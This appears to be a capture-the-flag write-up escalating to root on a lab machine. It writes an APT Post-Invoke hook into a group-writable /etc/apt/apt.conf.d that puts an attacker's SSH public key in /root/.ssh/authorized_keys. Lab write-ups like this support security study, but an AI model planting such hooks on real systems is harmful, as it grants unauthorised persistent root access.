# Privilege escalation to root
## `id` command shows that john is member of `management` group and using `find` to find files/folders owned by `management` group
 `id` command shows that john is member of `management` group and using `find` command to find files/folders owned by `management` group shows that ` /etc/apt/apt.conf.d` is owned by `management` group.
```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
john@writer:~$ ls -la /etc/apt/apt.conf.d
total 48
drwxrwxr-x 2 root management 4096 Oct  3 14:54 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
john@writer:~$
```
## Using [link](https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html) to escalate privilges to root 
To Create a file in  directory `/etc/apt/apt.conf.d` called, for example, `1000-pwned` and the write your hooks within it:
like below
``` 
APT::Update::Post-Invoke {"id > /tmp/whoami";};
```
So that when `apt` is run (which is run with root privileges) , executes `id > /tmp/whoami` as root .
So using this method we can make file called `1000-pwned` and add 
```
APT::Update::Post-Invoke {"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/mwm452HoYqTenuKZfoWk/GzXPOU7PHemPETWNWQw8mSBcy52PYGqqMYJ+L0Rj3F1xO/iVDw8w0kd6fcROiY6A2YpWAN/lqiUDlR/w3WREZj27Bp8G+FIm9fqNJqIV7y+gSpZUkgohqvb+z0iSWTT2k8bw9Ey7xKM35UMequdEUIyQpVG8/U75heBKkgk78k0inGBQ22ZBNcEsl0+CsCmtqJR3tkkcCLWaPnpsh5VWalwG3qMfU0b0fweTUC+yWr0PPad0mIc0qXsflSw6pD6WWDKnv0aLLToFMkTQymta5dV2kRbWQILlaWoNjuKd/btzek+VF53r/y1pZvkqlD/CJFtaWRtJ4ftVX1RFo8d1iSjMNEqpSt4hhhsJllLU2vivCBI+qpv6ziviLKBzUCSr+s5DAJ6Gcw7CUFy167utJHhx0AN1ePTq/szTNH2QdZ0qrZixx6KIBKWpoqaBSu9x5sw28J0ciEOuB8dU/YjGdk2cF+BxiJcCjAyaAztTVk= kali@kali' > /root/.ssh/authorized_keys";};
```
So that when apt is run , kali vm public key is copied to /root/.ssh/authorized_keys and we can ssh login as root like below we ssh logged in as root.
![[Pasted image 20211004135338.png]]
